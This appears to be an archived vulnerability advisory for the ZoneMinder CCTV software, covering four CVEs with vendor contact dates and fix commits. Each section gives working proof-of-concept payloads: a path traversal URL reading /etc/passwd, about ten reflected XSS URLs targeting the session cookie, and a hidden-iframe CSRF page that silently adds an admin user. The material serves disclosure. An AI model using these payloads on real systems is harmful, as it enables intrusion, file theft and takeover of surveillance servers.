@@ -1,0 +1,114 @@
+id: 26901
+date: 02/05/2017
+title: ZoneMinder - Multiple Vulnerabilities
+author: John Marzella
+cves: CVE-2017-5595, CVE-2017-5367, CVE-2017-5368, CVE-2016-10140
+
+==========================================================================
+Product: ZoneMinder
+Versions: Multiple versions - see inline
+Vulnerabilities: File disclosure, XSS, CSRF, Auth bypass & Info disclosure
+CVE-IDs: CVE-2017-5595, CVE-2017-5367, CVE-2017-5368, CVE-2016-10140
+Author: John Marzella
+Date: 03/02/2017
+==========================================================================
+
+
+
+CVE-2016-10140 - Auth bypass and Info disclosure - affects v1.30 and v1.29
+==========================================================================
+Contacted vendor on 08/11/2016
+
+Apache HTTP Server configuration bundled with ZoneMinder allows a remote unauthenticated attacker to browse all directories in the web root, e.g., a remote unauthenticated attacker can view all CCTV images on the server.
+
+PoC: http://<serverIP>/events
+
+Fix: https://github.com/ZoneMinder/ZoneMinder/commit/71898df7565ed2a51dfe76a1cf30ddb81fc888ba
+
+
+
+CVE-2017-5595 - File disclosure - affects v1.xx - code from 2008
+================================================================
+Contacted vendor on 22/01/2017
+
+File disclosure and inclusion vulnerability exists in ZoneMinder v1.30.0 due to unfiltered user-input being passed to readfile() in views/file.php which allows an authenticated attacker to read local system files (e.g. /etc/passwd) in the context of the web server user (www-data).
+
+PoC: http://<serverIP>/zm/index.php?view=file&path=/../../../../../etc/passwd
+
+Fix: https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3
+
+
+
+CVE-2017-5367 - XSS - affects v1.30 and v1.29
+=============================================
+Contacted vendor on 20/11/2016
+
+Multiple reflected XSS exists.
+
+The following has been injected into vulnerable URL’s to show that the users session cookie can be stolen.
+%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+In form input view using POST at http://<serverIP>/zm/
+PoC: http://<serverIP>/zm/index.php?action=login&view=postlogin%3Cscript%3Ealert(document.cookie);%3C/script%3E&postLoginQuery=1&username=testuser&password=testpassword
+
+In link input view using GET at http://<serverIP>/zm/
+PoC: http://<serverIP>/zm/?view=groups%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+In link input filter[terms][1][cnj] using GET at http://<serverIP>/zm/
+PoC: http://<serverIP>/zm/?view=events&page=1&filter[terms][0][attr]=DateTime&filter[terms][0][op]=%3E%3D&filter[terms][0][val]=-1%2Bhour&filter[terms][1][cnj]=and%3Cscript%3Ealert(document.cookie);%3C/script%3E&filter[terms][1][attr]=MonitorId&filter[terms][1][op]=%3D&filter[terms][1][val]=1
+
+In form input view using GET at http://<serverIP>/zm/index.php
+PoC: http://<serverIP>/zm/index.php?view=console%3Cscript%3Ealert(document.cookie);%3C/script%3E&action=1&addBtn=Add%20New%20Monitor&editBtn=Edit&deleteBtn=Delete&markMids[]=2
+
+In form input filter[terms][1][cnj] using POST at http://<serverIP>/zm/index.php PoC: http://<serverIP>/zm/index.php?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=Archived&filter%5Bterms%5D%5B0%5D%5Bop%5D=%3D&filter%5Bterms%5D%5B0%5D%5Bval%5D=1&filter%5Bterms%5D%5B1%5D%5Bcnj%5D=and%3Cscript%3Ealert(document.cookie);%3C/script%3E&filter%5Bterms%5D%5B1%5D%5Battr%5D=MonitorId&filter%5Bterms%5D%5B1%5D%5Bop%5D=%3D&filter%5Bterms%5D%5B1%5D%5Bval%5D=1
+
+In form input filter[terms][1][cnj] using POST at http://<serverIP>/zm/
+PoC: http://<serverIP>/zm/?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=DateTime&filter%5Bterms%5D%5B0%5D%5Bop%5D=&filter%5Bterms%5D%5B0%5D%5Bval%5D=-1+hour&filter%5Bterms%5D%5B1%5D%5Bcnj%5D=%3Cscript%3Ealert(document.cookie);%3C/script%3Eand&filter%5Bterms%5D%5B1%5D%5Battr%5D=MonitorId&filter%5Bterms%5D%5B1%5D%5Bop%5D==&filter%5Bterms%5D%5B1%5D%5Bval%5D=1
+
+In form input limit using POST at http://<serverIP>/zm/index.php
+PoC: http://<serverIP>/zm/index.php?view=events&action=1&page=1&filter[terms][0][attr]=DateTime&filter[terms][0][op]=%3E%3D&filter[terms][0][val]=-1%2Bmonth&sort_field=StartTime&sort_asc=1&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+In link input limit using GET at http://<serverIP>/zm/index.php
+PoC: http://<serverIP>/zm/index.php?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=DateTime&filter%5Bterms%5D%5B0%5D%5Bop%5D=%3E%3D&filter%5Bterms%5D%5B0%5D%5Bval%5D=-1%2Bmonth&sort_field=Id&sort_asc=0&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+In form input limit using POST at http://<serverIP>/zm/
+PoC: http://<serverIP>/zm/?view=events&action=1&page=1&sort_field=StartTime&sort_asc=1&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+In link input limit using GET at http://<serverIP>/zm/
+PoC: http://<serverIP>/zm/?view=events&page=1&sort_field=Id&sort_asc=0&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+
+
+
+CVE-2017-5368 - CSRF - affects v1.30 and v1.29
+==============================================
+Contacted vendor on 20/11/2016
+
+No CSRF protection exists across entire web app.
+
+PoC: The following html page silently adds a new admin user to Zoneminder if the admin user is already logged in.
+
+csrf_poc_addUser.html
+
+<!-- Example of silent CSRF using iframe -->
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action="http://<serverIP>/zm/index.php" target="csrf-frame" id="csrf-form">
+<input type="hidden" name="view" value="user"/>
+<input type="hidden" name="action" value="user"/>
+<input type="hidden" name="uid" value="0"/>
+<input type="hidden" name="newUser[MonitorIds]" value=""/>
+<input type="hidden" name="newUser[Username]" value="attacker1"/>
+<input type="hidden" name="newUser[Password]" value="Password1234"/>
+<input type="hidden" name="conf_password" value="Password1234"/>
+<input type="hidden" name="newUser[Language]" value="en_gb"/>
+<input type="hidden" name="newUser[Enabled]" value="1"/>
+<input type="hidden" name="newUser[Stream]" value="View"/>
+<input type="hidden" name="newUser[Events]" value="Edit"/>
+<input type="hidden" name="newUser[Control]" value="Edit"/>
+<input type="hidden" name="newUser[Monitors]" value="Edit"/>
+<input type="hidden" name="newUser[Groups]" value="Edit"/>
+<input type="hidden" name="newUser[System]" value="Edit"/>
+<input type="hidden" name="newUser[MaxBandwidth]" value="high"/>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+
+#  0day.today [2023-03-23]  #
